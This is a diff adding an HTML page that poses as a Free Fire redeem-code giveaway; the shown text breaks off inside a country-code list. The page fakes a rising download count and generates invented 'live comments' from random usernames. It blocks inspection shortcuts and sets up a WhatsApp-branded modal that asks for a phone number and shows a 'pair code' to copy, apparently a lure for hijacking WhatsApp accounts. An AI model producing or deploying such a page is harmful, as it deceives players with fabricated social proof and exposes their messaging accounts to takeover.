@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, maximum-scale=1.0, user-scalable=no">
+  <title>FF Redeem Code — Watch & Claim</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #eef2f6;
+      color: #222;
+      min-height: 100vh;
+    }
+    header {
+      background: linear-gradient(135deg, #FFE066, #FFB300, #FFD740, #FFA000);
+      background-size: 300% 300%;
+      animation: headerBg 5s ease infinite;
+      padding: 22px 16px 20px;
+      text-align: center;
+      box-shadow: 0 3px 12px rgba(255, 179, 0, 0.25);
+    }
+    @keyframes headerBg {
+      0%, 100% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+    }
+    .header-brand {
+      display: inline-block;
+      padding: 10px 22px 12px;
+      border: 2px solid rgba(120, 80, 0, 0.25);
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.35);
+      animation: brandPulse 2.2s ease-in-out infinite;
+    }
+    @keyframes brandPulse {
+      0%, 100% { transform: scale(1); box-shadow: 0 0 0 rgba(255, 200, 0, 0); }
+      50% { transform: scale(1.03); box-shadow: 0 0 18px rgba(255, 180, 0, 0.45); }
+    }
+    header h1 {
+      font-size: 24px;
+      font-weight: 800;
+      letter-spacing: 0.6px;
+      line-height: 1.25;
+      text-transform: uppercase;
+      background: linear-gradient(90deg, #3d2a00, #7a5200, #3d2a00, #5c4000, #3d2a00);
+      background-size: 200% auto;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      animation: titleShine 3s linear infinite;
+    }
+    @keyframes titleShine {
+      0% { background-position: 0% center; }
+      100% { background-position: 200% center; }
+    }
+    header h1 span {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      -webkit-text-fill-color: #6b4a00;
+      color: #6b4a00;
+      margin-bottom: 4px;
+      animation: spanFade 2s ease-in-out infinite;
+    }
+    @keyframes spanFade {
+      0%, 100% { opacity: 1; letter-spacing: 2px; }
+      50% { opacity: 0.75; letter-spacing: 3px; }
+    }
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 14px;
+    }
+    .video-section {
+      text-align: center;
+      margin-bottom: 14px;
+    }
+    .video-section h2 {
+      font-size: 17px;
+      font-weight: 700;
+      color: #333;
+      letter-spacing: 0.8px;
+      margin-bottom: 10px;
+    }
+    .video-box {
+      background: #fff;
+      border-radius: 12px;
+      overflow: hidden;
+      border: 1px solid #dde3ea;
+      position: relative;
+    }
+    .video-box video {
+      width: 100%;
+      display: block;
+      aspect-ratio: 16 / 9;
+      object-fit: cover;
+      background: #111;
+      -webkit-user-select: none;
+      user-select: none;
+      -webkit-user-drag: none;
+    }
+    .app-card {
+      background: #fff;
+      border-radius: 14px;
+      padding: 16px;
+      border: 1px solid #dde3ea;
+    }
+    .app-row {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .app-icon {
+      width: 72px;
+      height: 72px;
+      border-radius: 14px;
+      object-fit: cover;
+      flex-shrink: 0;
+      -webkit-user-select: none;
+      user-select: none;
+      -webkit-user-drag: none;
+      pointer-events: none;
+    }
+    .app-info {
+      flex: 1;
+      min-width: 0;
+    }
+    .tags {
+      display: flex;
+      gap: 6px;
+      margin-bottom: 6px;
+    }
+    .tag {
+      font-size: 11px;
+      padding: 4px 10px;
+      border-radius: 12px;
+      font-weight: 600;
+    }
+    .tag-new {
+      background: #ff3b3b;
+      color: #fff;
+    }
+    .tag-premium {
+      background: #6a5cff;
+      color: #fff;
+    }
+    .app-name {
+      font-size: 17px;
+      font-weight: 700;
+      color: #222;
+      margin: 4px 0;
+    }
+    .app-desc {
+      font-size: 12px;
+      color: #666;
+      line-height: 1.4;
+    }
+    .stars {
+      color: #ffcc00;
+      font-size: 15px;
+      margin-top: 6px;
+    }
+    .install-stat {
+      text-align: center;
+      font-size: 11px;
+      color: #888;
+      margin: 14px 0 10px;
+    }
+    .install-stat strong {
+      color: #00aa6c;
+      font-weight: 700;
+    }
+    .install-btn {
+      display: block;
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 30px;
+      font-size: 17px;
+      font-weight: 700;
+      color: #fff;
+      text-align: center;
+      text-decoration: none;
+      background: linear-gradient(90deg, #00ff88, #00cc6a);
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      z-index: 0;
+    }
+    .install-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -80%;
+      width: 50%;
+      height: 100%;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, 0.15),
+        rgba(255, 255, 255, 0.55),
+        rgba(255, 255, 255, 0.15),
+        transparent
+      );
+      transform: skewX(-22deg);
+      animation: btnSideShine 2.4s ease-in-out infinite;
+      pointer-events: none;
+      z-index: 0;
+    }
+    .install-btn .btn-label {
+      position: relative;
+      z-index: 1;
+    }
+    @keyframes btnSideShine {
+      0% { left: -80%; }
+      40%, 100% { left: 130%; }
+    }
+    .install-btn:active {
+      opacity: 0.9;
+    }
+    .live-chat {
+      margin-top: 14px;
+      border-top: 1px solid #eef1f5;
+      padding-top: 12px;
+    }
+    .live-chat-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 8px;
+    }
+    .live-chat-title {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      font-weight: 700;
+      color: #333;
+    }
+    .live-dot-chat {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #e53935;
+      animation: blink 0.8s ease-in-out infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+    .comment-count {
+      font-size: 11px;
+      color: #888;
+      font-weight: 600;
+    }
+    .comments-scroll {
+      max-height: 200px;
+      overflow-y: auto;
+      overflow-x: hidden;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      padding-right: 2px;
+      scroll-behavior: smooth;
+    }
+    .comments-scroll::-webkit-scrollbar {
+      width: 3px;
+    }
+    .comments-scroll::-webkit-scrollbar-thumb {
+      background: #ccc;
+      border-radius: 3px;
+    }
+    .comment {
+      display: flex;
+      gap: 8px;
+      animation: commentPop 0.25s ease;
+    }
+    @keyframes commentPop {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .comment-avatar {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 700;
+      color: #fff;
+    }
+    .comment-body {
+      flex: 1;
+      min-width: 0;
+    }
+    .comment-meta {
+      display: flex;
+      align-items: baseline;
+      gap: 6px;
+      margin-bottom: 2px;
+    }
+    .comment-name {
+      font-size: 12px;
+      font-weight: 700;
+      color: #1a1a1a;
+    }
+    .comment-time {
+      font-size: 10px;
+      color: #999;
+    }
+    .comment-text {
+      font-size: 12px;
+      color: #444;
+      line-height: 1.35;
+      word-break: break-word;
+    }
+    .typing-bar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 0 2px;
+      min-height: 28px;
+    }
+    .typing-avatar {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #ddd;
+      flex-shrink: 0;
+    }
+    .typing-dots {
+      display: flex;
+      gap: 4px;
+      padding: 6px 10px;
+      background: #f0f2f5;
+      border-radius: 14px;
+    }
+    .typing-dots span {
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: #999;
+      animation: typeDot 1s ease-in-out infinite;
+    }
+    .typing-dots span:nth-child(2) { animation-delay: 0.15s; }
+    .typing-dots span:nth-child(3) { animation-delay: 0.3s; }
+    @keyframes typeDot {
+      0%, 100% { opacity: 0.3; transform: translateY(0); }
+      50% { opacity: 1; transform: translateY(-3px); }
+    }
+    .typing-bar.hidden {
+      display: none;
+    }
+    footer {
+      text-align: center;
+      padding: 14px;
+      font-size: 11px;
+      color: #999;
+    }
+    @media (max-width: 400px) {
+      header h1 { font-size: 20px; }
+      header h1 span { font-size: 11px; }
+      .video-section h2 { font-size: 15px; }
+      .app-icon { width: 60px; height: 60px; }
+      .install-btn { font-size: 15px; padding: 13px; }
+    }
+    .header-logo {
+      width: 52px;
+      height: 52px;
+      border-radius: 12px;
+      object-fit: cover;
+      margin-bottom: 8px;
+      border: 2px solid rgba(120, 80, 0, 0.2);
+      -webkit-user-select: none;
+      user-select: none;
+      -webkit-user-drag: none;
+      pointer-events: none;
+    }
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(238, 242, 246, 0.92);
+      backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.2s ease, visibility 0.2s ease;
+    }
+    .modal-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    .modal-container {
+      background: #fff;
+      border: 1px solid #dde3ea;
+      border-top: 3px solid #FFB300;
+      border-radius: 14px;
+      max-width: 400px;
+      width: 90%;
+      margin: 20px;
+      position: relative;
+      box-shadow: 0 12px 40px rgba(255, 179, 0, 0.15), 0 8px 24px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+    }
+    .modal-close {
+      position: absolute;
+      top: 10px;
+      right: 14px;
+      font-size: 24px;
+      color: #999;
+      cursor: pointer;
+      line-height: 1;
+      z-index: 10;
+      background: none;
+      border: none;
+    }
+    .modal-close:hover {
+      color: #333;
+    }
+    .modal-content {
+      padding: 28px 22px 24px;
+      text-align: center;
+    }
+    .popup-left {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+      margin-bottom: 8px;
+    }
+    .whatsapp {
+      font-size: 1.75em;
+      color: #25d366;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+    }
+    .popup-left img {
+      width: 120px;
+      height: auto;
+      border-radius: 12px;
+    }
+    .header-divider {
+      width: 60px;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #FFB300, transparent);
+      margin-top: 8px;
+    }
+    .modal-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #222;
+      margin-bottom: 8px;
+      letter-spacing: 0.5px;
+    }
+    .modal-sub {
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 18px;
+      line-height: 1.45;
+    }
+    .input-group {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+    .country-code {
+      flex: 1;
+      min-width: 60px;
+      max-width: 38%;
+      padding: 12px 8px;
+      border: 1px solid #dde3ea;
+      border-radius: 10px;
+      background: #f8f9fb;
+      color: #222;
+      font-size: 13px;
+      outline: none;
+    }
+    .phone-input {
+      flex: 2;
+      min-width: 0;
+      padding: 12px;
+      border: 1px solid #dde3ea;
+      border-radius: 10px;
+      background: #fff;
+      color: #222;
+      font-size: 14px;
+      outline: none;
+    }
+    .country-code:focus,
+    .phone-input:focus {
+      border-color: #FFB300;
+      box-shadow: 0 0 0 2px rgba(255, 179, 0, 0.15);
+    }
+    .get-code-btn {
+      width: 100%;
+      padding: 14px 20px;
+      border: none;
+      border-radius: 30px;
+      background: linear-gradient(90deg, #00ff88, #00cc6a);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 6px 20px rgba(0, 204, 106, 0.25);
+    }
+    .get-code-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -80%;
+      width: 50%;
+      height: 100%;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, 0.15),
+        rgba(255, 255, 255, 0.45),
+        rgba(255, 255, 255, 0.15),
+        transparent
+      );
+      transform: skewX(-22deg);
+      animation: btnSideShine 2.4s ease-in-out infinite;
+      pointer-events: none;
+    }
+    .get-code-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .pair-code {
+      background: linear-gradient(135deg, #fffbeb, #fff8e1);
+      padding: 16px;
+      font-family: monospace;
+      font-size: 24px;
+      letter-spacing: 5px;
+      color: #7a5200;
+      border: 1px solid rgba(255, 179, 0, 0.35);
+      border-radius: 12px;
+      margin: 16px 0;
+      word-break: break-all;
+    }
+    .copy-code-btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 30px;
+      background: linear-gradient(90deg, #00ff88, #00cc6a);
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 6px 20px rgba(0, 204, 106, 0.2);
+      transition: opacity 0.2s;
+    }
+    .copy-code-btn:hover {
+      opacity: 0.92;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-brand">
+      <img src="https://www.image2url.com/r2/default/files/1792654491880-105c2ad3-157c-4639-bf65-ad31a26b9ece.png" alt="FF Redeem Code" class="header-logo" draggable="false" oncontextmenu="return false;" ondragstart="return false;">
+      <h1><span>Free Fire</span>Redeem Code</h1>
+    </div>
+  </header>
+  <div class="container">
+    <section class="video-section">
+      <h2>WATCH FULL VIDEO</h2>
+      <div class="video-box">
+        <video
+          controls
+          controlsList="nodownload noremoteplayback noplaybackrate"
+          disablePictureInPicture
+          oncontextmenu="return false;"
+          ondragstart="return false;"
+          id="protectedVideo"
+          preload="auto"
+          playsinline
+          autoplay
+          draggable="false"
+        >
+          <source src="https://www.image2url.com/r2/default/files/1792654459784-688dafb8-e910-4ff3-81ca-bf345723c77d.mp4" type="video/mp4">
+          Your browser does not support the video tag.
+        </video>
+      </div>
+    </section>
+    <section class="app-card">
+      <div class="app-row">
+        <img src="https://www.image2url.com/r2/default/files/1792654491880-105c2ad3-157c-4639-bf65-ad31a26b9ece.png" alt="FF Redeem Code" class="app-icon" draggable="false" oncontextmenu="return false;" ondragstart="return false;">
+        <div class="app-info">
+          <div class="tags">
+            <span class="tag tag-new">HOT</span>
+            <span class="tag tag-premium">VERIFIED</span>
+          </div>
+          <h3 class="app-name">REDEEM CODE</h3>
+          <p class="app-desc">FREE FIRE REDEEM CODE · UNLIMITED ACCESS · NO BAN</p>
+          <div class="stars">★★★★★</div>
+        </div>
+      </div>
+      <p class="install-stat"><strong id="recentDownloads">3,241</strong> redeems in last hour</p>
+      <a href="#" class="install-btn" id="installBtn"><span class="btn-label">🎟 Get Redeem Code</span></a>
+      <div class="live-chat">
+        <div class="live-chat-header">
+          <div class="live-chat-title">
+            <span class="live-dot-chat"></span>
+            Live Comments
+          </div>
+          <span class="comment-count" id="commentCount">1,284 watching</span>
+        </div>
+        <div class="comments-scroll" id="chatList"></div>
+        <div class="typing-bar hidden" id="typingBar">
+          <div class="typing-avatar" id="typingAvatar"></div>
+          <div class="typing-dots"><span></span><span></span><span></span></div>
+        </div>
+      </div>
+    </section>
+  </div>
+  <footer>
+    <p>©️ 2026 — Not affiliated with Garena Free Fire</p>
+  </footer>
+
+  <script>
+    // Disable right-click, inspect, and common shortcuts globally
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (e.keyCode === 123 ||
+          (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
+          (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 80))) {
+        e.preventDefault();
+      }
+    });
+    document.addEventListener('dragstart', e => e.preventDefault());
+    document.addEventListener('selectstart', e => {
+      if (e.target.tagName === 'VIDEO' || e.target.tagName === 'IMG') e.preventDefault();
+    });
+
+    const video = document.getElementById('protectedVideo');
+    if (video) {
+      video.volume = 1.0;
+      video.addEventListener('contextmenu', e => e.preventDefault());
+      video.addEventListener('dragstart', e => e.preventDefault());
+      video.addEventListener('loadedmetadata', () => {
+        // Extra protection layer
+        video.setAttribute('controlsList', 'nodownload noremoteplayback noplaybackrate');
+      });
+
+      let playAttempted = false;
+      const attemptPlay = () => {
+        if (playAttempted) return;
+        playAttempted = true;
+        video.play().catch(() => {
+          document.addEventListener('click', function playOnClick() {
+            video.play();
+            document.removeEventListener('click', playOnClick);
+          }, { once: true });
+        });
+      };
+      if (video.readyState >= 3) attemptPlay();
+      else video.addEventListener('canplay', attemptPlay, { once: true });
+    }
+
+    // Protect all images
+    document.querySelectorAll('img').forEach(img => {
+      img.addEventListener('contextmenu', e => e.preventDefault());
+      img.addEventListener('dragstart', e => e.preventDefault());
+      img.draggable = false;
+    });
+
+    const dlEl = document.getElementById('recentDownloads');
+    let downloads = 3241;
+    setInterval(() => {
+      downloads += [89, 127, 56][Math.floor(Math.random() * 3)];
+      if (dlEl) dlEl.textContent = downloads.toLocaleString();
+    }, 2000);
+
+    const avatarColors = [
+      '#e53935', '#8e24aa', '#3949ab', '#1e88e5', '#00897b',
+      '#43a047', '#f4511e', '#6d4c41', '#546e7a', '#d81b60',
+      '#5c6bc0', '#26a69a', '#ef5350', '#ab47bc', '#7e57c2'
+    ];
+    const nameParts = {
+      first: ['Aarav', 'Vivaan', 'Aditya', 'Arjun', 'Krishna', 'Ishaan', 'Rohan', 'Karan', 'Rahul', 'Mohit', 'Yash', 'Aman', 'Deepak', 'Sumit', 'Ankit', 'Manish', 'Ritesh', 'Vikas', 'Abhishek', 'Nikhil', 'Harsh', 'Ravi', 'Ajay', 'Lokesh', 'Gaurav', 'Tarun', 'Shivam', 'Vivek', 'Sandeep', 'Pankaj', 'Neeraj', 'Varun', 'Kunal', 'Dev', 'Rohan', 'Sahil', 'Nitin', 'Prakash'],
+      tag: ['FF', 'Pro', 'OP', 'Gaming', 'YT', 'X', 'King', 'Boss', 'HD', 'Live', 'Max', 'V2', 'Zone', 'Clan'],
+      city: ['Mumbai', 'Delhi', 'Pune', 'Jaipur', 'Lucknow', 'Patna', 'Surat', 'Indore', 'Nagpur', 'Bhopal', 'Kolkata', 'Chennai', 'Hyderabad', 'Ahmedabad']
+    };
+    const msgParts = {
+      open: ['bhai', 'yaar', 'bro', 'arey', 'omg', 'dekho', 'sach me', 'finally', 'abe', 'sun', 'han bhai', ''],
+      thing: ['redeem code', 'free redeem code', 'ff redeem', 'redeem trick', 'ye app', '300 redeem code', 'code generator', 'signup redeem', 'direct redeem', 'mod', 'update', 'OB54 trick'],
+      status: ['ho gaya', 'hogya', 'done hai', 'working hai', 'mil gaya', 'redeem hogya', 'activate hogya', 'aa gaya', 'set hai', 'running hai'],
+      good: ['100%', 'fast', 'real', 'free me', 'mast', 'solid', 'OP', 'best', 'verified', 'safe', 'instant', 'no ban'],
+      city: nameParts.city,
+      time: ['1 min', '2 min', '30 sec', '5 min', 'abhi', 'thodi der'],
+      end: ['thanks', 'share karo', 'jaldi karo', 'legend', 'fire', 'redeem code mil gaya', 'try karo sab', 'worth it']
+    };
+    const emojis = [
+      '🔥', '✅', '🙏', '🎟️', '👍', '❤️', '💯', '😍', '🤩', '⚡', '🎮', '🆓',
+      '⭐', '👀', '😂', '🥳', '💪', '🚀', '✨', '👑', '🎯', '💥', '🫡', '😎'
+    ];
+    const seps = [' -- ', ' — ', ', ', ' | ', ' >> ', ' ~ '];
+    const rareTemplates = [
+      'bhai ye real hai, redeem karo',
+      'redeem code mil gaya thanks',
+      'no ban unlimited redeem code mil gaya',
+      '300 redeem code activate hogya bhai',
+      'free redeem code working hai 100%'
+    ];
+    const chatList = document.getElementById('chatList');
+    const typingBar = document.getElementById('typingBar');
+    const typingAvatar = document.getElementById('typingAvatar');
+    const commentCountEl = document.getElementById('commentCount');
+    const maxChats = 12;
+    let commentTotal = 1284 + Math.floor(Math.random() * 200);
+    let typingTimer = null;
+    let cycleTimer = null;
+
+    function rand(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+    function pick(arr) {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+    function maybe(part, chance) {
+      return Math.random() < chance ? pick(part) + ' ' : '';
+    }
+    function randomSep() {
+      return pick(seps);
+    }
+    function randomEmoji(count) {
+      const n = count || rand(1, 3);
+      let out = '';
+      for (let i = 0; i < n; i++) out += pick(emojis);
+      return out;
+    }
+    function wrapEmojis(msg) {
+      if (Math.random() < 0.07) return randomEmoji(rand(2, 5));
+      const roll = rand(1, 6);
+      const e1 = Math.random() < 0.55 ? randomEmoji(rand(1, 2)) : '';
+      const e2 = Math.random() < 0.45 ? randomEmoji(rand(1, 2)) : '';
+      if (roll === 1 && e1) return e1 + ' ' + msg;
+      if (roll === 2 && e2) return msg + ' ' + e2;
+      if (roll === 3 && e1 && e2) return e1 + ' ' + msg + ' ' + e2;
+      if (roll === 4 && e1) return msg + ' ' + e1 + e1;
+      if (roll === 5 && Math.random() < 0.4) return msg + ' ' + randomEmoji(1);
+      return msg;
+    }
+    function randomName() {
+      if (Math.random() < 0.1) {
+        return pick(nameParts.first) + pick(nameParts.tag) + rand(1, 99);
+      }
+      const builders = [
+        () => pick(nameParts.first) + pick(['_', '.', '']) + pick(nameParts.tag) + rand(1, 999),
+        () => pick(nameParts.first).slice(0, rand(3, 6)) + rand(10, 9999),
+        () => pick(nameParts.city).slice(0, rand(3, 5)).toLowerCase() + pick(nameParts.tag) + rand(1, 99),
+        () => String.fromCharCode(rand(97, 122)) + pick(nameParts.first) + rand(1, 999),
+        () => pick(nameParts.first).toLowerCase() + rand(100, 9999),
+        () => pick(nameParts.tag) + pick(nameParts.first) + rand(1, 99),
+        () => pick(nameParts.first) + rand(1988, 2012),
+        () => 'x' + pick(nameParts.first) + rand(1, 999),
+        () => pick(nameParts.first) + pick(nameParts.city).slice(0, 3) + rand(1, 9)
+      ];
+      return pick(builders)();
+    }
+    function randomMessage() {
+      if (Math.random() < 0.1) {
+        return wrapEmojis(pick(rareTemplates));
+      }
+      const s = rand(1, 10);
+      let msg = '';
+      if (s <= 3) {
+        msg = maybe(msgParts.open, 0.7) +
+          pick(msgParts.thing) + ' ' +
+          pick(msgParts.status) +
+          (Math.random() < 0.5 ? randomSep() + pick(msgParts.end) : '');
+      } else if (s <= 5) {
+        msg = pick(msgParts.city) + ' se' + randomSep() +
+          pick(msgParts.thing) + ' ' +
+          pick(msgParts.status);
+      } else if (s <= 7) {
+        msg = pick(msgParts.time) + ' me ' +
+          pick(msgParts.status) + randomSep() +
+          pick(msgParts.good) +
+          maybe(msgParts.end, 0.4);
+      } else if (s === 8) {
+        msg = pick(msgParts.open) + randomSep() +
+          pick(msgParts.good) + ' ' +
+          pick(msgParts.thing) + ' ' +
+          pick(msgParts.status);
+      } else {
+        msg = pick(msgParts.thing) + ' ' +
+          pick(msgParts.status) + randomSep() +
+          pick(msgParts.end);
+      }
+      return wrapEmojis(msg.replace(/\s+/g, ' ').trim());
+    }
+    function randomTime() {
+      if (Math.random() < 0.4) return 'just now';
+      return rand(1, 9) + 's ago';
+    }
+    function randomColor() {
+      if (Math.random() < 0.5) {
+        return 'hsl(' + rand(0, 360) + ',' + rand(45, 75) + '%,' + rand(38, 52) + '%)';
+      }
+      return pick(avatarColors);
+    }
+    function getInitial(name) {
+      const c = name.replace(/[^a-zA-Z]/, '').charAt(0);
+      return (c || 'U').toUpperCase();
+    }
+    function updateCommentCount() {
+      commentTotal += rand(1, 5);
+      if (commentCountEl) {
+        commentCountEl.textContent = commentTotal.toLocaleString() + ' watching';
+      }
+    }
+    function renderComment(name, text, time) {
+      const el = document.createElement('div');
+      el.className = 'comment';
+      const av = document.createElement('div');
+      av.className = 'comment-avatar';
+      av.style.background = randomColor();
+      av.textContent = getInitial(name);
+      const body = document.createElement('div');
+      body.className = 'comment-body';
+      const meta = document.createElement('div');
+      meta.className = 'comment-meta';
+      const nameEl = document.createElement('span');
+      nameEl.className = 'comment-name';
+      nameEl.textContent = name;
+      const timeEl = document.createElement('span');
+      timeEl.className = 'comment-time';
+      timeEl.textContent = time;
+      const textEl = document.createElement('p');
+      textEl.className = 'comment-text';
+      textEl.textContent = text;
+      meta.appendChild(nameEl);
+      meta.appendChild(timeEl);
+      body.appendChild(meta);
+      body.appendChild(textEl);
+      el.appendChild(av);
+      el.appendChild(body);
+      return el;
+    }
+    function showTyping(name) {
+      if (!typingBar || !typingAvatar) return;
+      typingAvatar.style.background = randomColor();
+      typingBar.classList.remove('hidden');
+    }
+    function hideTyping() {
+      if (typingBar) typingBar.classList.add('hidden');
+    }
+    function pushComment(name, text, time) {
+      chatList.appendChild(renderComment(name, text, time));
+      while (chatList.children.length > maxChats) {
+        chatList.removeChild(chatList.firstChild);
+      }
+      chatList.scrollTop = chatList.scrollHeight;
+      updateCommentCount();
+    }
+    function postInstantComment() {
+      pushComment(randomName(), randomMessage(), 'just now');
+    }
+    function postWithTyping(callback) {
+      const name = randomName();
+      const text = randomMessage();
+      showTyping(name);
+      clearTimeout(typingTimer);
+      typingTimer = setTimeout(() => {
+        hideTyping();
+        pushComment(name, text, randomTime());
+        if (callback) callback();
+      }, rand(250, 700));
+    }
+    function pickBurstSize() {
+      const r = Math.random();
+      if (r < 0.42) return 1;
+      if (r < 0.72) return 2;
+      if (r < 0.92) return 3;
+      return rand(3, 4);
+    }
+    function runBurst(left, isFirst, burstTotal) {
+      if (left <= 0) {
+        const pause = burstTotal === 1 ? rand(1600, 3400) : rand(800, 1900);
+        cycleTimer = setTimeout(runCommentCycle, pause);
+        return;
+      }
+      const next = () => {
+        setTimeout(() => runBurst(left - 1, false, burstTotal), rand(80, 280));
+      };
+      if (isFirst) {
+        postWithTyping(next);
+      } else {
+        postInstantComment();
+        next();
+      }
+    }
+    function runCommentCycle() {
+      if (!chatList) return;
+      const burst = pickBurstSize();
+      runBurst(burst, true, burst);
+    }
+    for (let i = 0; i < 5; i++) {
+      pushComment(randomName(), randomMessage(), i === 4 ? 'just now' : rand(1, 8) + 's ago');
+    }
+    runCommentCycle();
+    setInterval(updateCommentCount, 3000);
+  </script>
+
+  <script>
+    (function () {
+      const installBtn = document.getElementById('installBtn');
+      if (!installBtn) return;
+
+      const countryList = [
+        { code: "+91", name: "India", flag: "🇮🇳" },
+        { code: "+1", name: "USA", flag: "🇺🇸" },
+        { code: "+44", name: "UK", flag: "🇬🇧" },
+        { code: "+61", name: "Australia", flag: "🇦🇺" },
+        { code: "+81", name: "Japan", flag: "🇯🇵" },
+        { code: "+86", name: "China", flag: "🇨🇳" },
+        { code: "+49", name: "Germany", flag: "🇩🇪" },
+        { code: "+33", name: "France", flag: "🇫🇷" },
+        { code: "+39", name: "Italy", flag: "🇮🇹" },
+        { code: "+7", name: "Russia", flag: "🇷🇺" },
+        { code: "+55", name: "Brazil", flag: "🇧🇷" },
+        { code: "+52", name: "Mexico", flag: "🇲🇽" },
+        { code: "+54", name: "Argentina", flag: "🇦🇷" },
+        { code: "+56", name: "Chile", flag: "🇨🇱" },
+        { code: "+57", name: "Colombia", flag: "🇨🇴" },
+        { code: "+27", name: "South Africa", flag: "🇿🇦" },
+        { code: "+20", name: "Egypt", flag: "🇪🇬" },
+        { code: "+234", name: "Nigeria", flag: "🇳🇬" },
+        { code: "+254", name: "Kenya", flag: "🇰🇪" },
+        { code: "+251", name: "Ethiopia", flag: "🇪🇹" },
+        { code: "+92", name: "Pakistan", flag: "🇵🇰" },
+        { code: "+880", name: "Bangladesh", flag: "🇧🇩" },
+        { code: "+94", name: "Sri Lanka", flag: "🇱🇰" },
+        { code: "+977", name: "Nepal", flag: "🇳🇵" },
+        { code: "+93", name: "Afghanistan", flag: "🇦🇫" },
+        { code: "+971", name: "UAE", flag: "🇦🇪" },
+        { code: "+966", name: "Saudi Arabia", flag: "🇸🇦" },
+        { code: "+974", name: "Qatar", flag: "🇶🇦" },
+        { code: "+965", name: "Kuwait", flag: "🇰🇼" },
+        { code: "+968", name: "Oman", flag: "🇴🇲" },
+        { code: "+90", name: "Turkey", flag: "🇹🇷" },
+        { code: "+98", name: "Iran", flag: "🇮🇷" },
+        { code: "+964", name: "Iraq", flag: "🇮🇶" },
+        { code: "+972", name: "Israel", flag: "🇮🇱" },
+        { code: "+961", name: "Lebanon", flag: "🇱🇧" },
+        { code: "+62", name: "Indonesia", flag: "🇮🇩" },
+        { code: "+60", name: "Malaysia", flag: "🇲🇾" },
+        { code: "+65", name: "Singapore", flag: "🇸🇬" },
+        { code: "+66", name: "Thailand", flag: "🇹🇭" },
+        { code: "+84", name: "Vietnam", flag: "🇻🇳" },
+        { code: "+63", name: "Philippines", flag: "🇵🇭" },
+        { code: "+82", name: "South Korea", flag: "🇰🇷" },
+        { code: "+886", name: "Taiwan", flag: "🇹🇼" },
+        { code: "+852", name: "Hong Kong", flag: "🇭🇰" },
+        { code: "+853", name: "Macau", flag: "🇲🇴" },
+        { code: "+31", name: "Netherlands", flag: "🇳🇱" },
+        { code: "+32", name: "Belgium", flag: "🇧🇪" },
+        { code: "+41", name: "Switzerland", flag: "🇨🇭" },
+        { code: "+46", name: "Sweden", flag: "🇸🇪" },
+        { code: "+47", name: "Norway", flag: "🇳🇴" },
+        { code: "+45", name: "Denmark", flag: "🇩🇰" },
+        { code: "+358", name: "Finland", flag: "🇫🇮" },
+        { code: "+48", name: "Poland", flag: "🇵🇱" },
+        { code: "+420", name: "Czech Republic", flag: "🇨🇿" },
+        { code: "+36", name: "Hungary", flag: "🇭🇺" },
+        { code: "+30", name: "Greece", flag: "🇬🇷" },
+        { code: "+351", name: "Portugal", flag: "🇵🇹" },
+        { code: "+34", name: "Spain", flag: "🇪🇸" },
+        { code: "+43", name: "Austria", flag: "🇦🇹" },
+        { code: "+353", name: "Ireland", flag: "🇮🇪" },
